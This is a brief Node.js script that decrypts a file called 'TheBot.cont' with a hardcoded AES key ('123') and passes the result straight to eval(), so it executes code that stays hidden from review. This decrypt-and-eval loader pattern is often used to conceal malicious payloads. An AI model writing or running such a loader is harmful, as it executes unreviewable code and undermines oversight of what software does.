const fs = require("fs");
const CryptoJS = require("crypto-js");
const encryptedFilePath = "TheBot.cont";
const encryptedData = fs.readFileSync(encryptedFilePath, "utf8");
const secretKey = "123";
const decryptedData = CryptoJS.AES.decrypt(encryptedData, secretKey).toString(
  CryptoJS.enc.Utf8
);
eval(decryptedData);
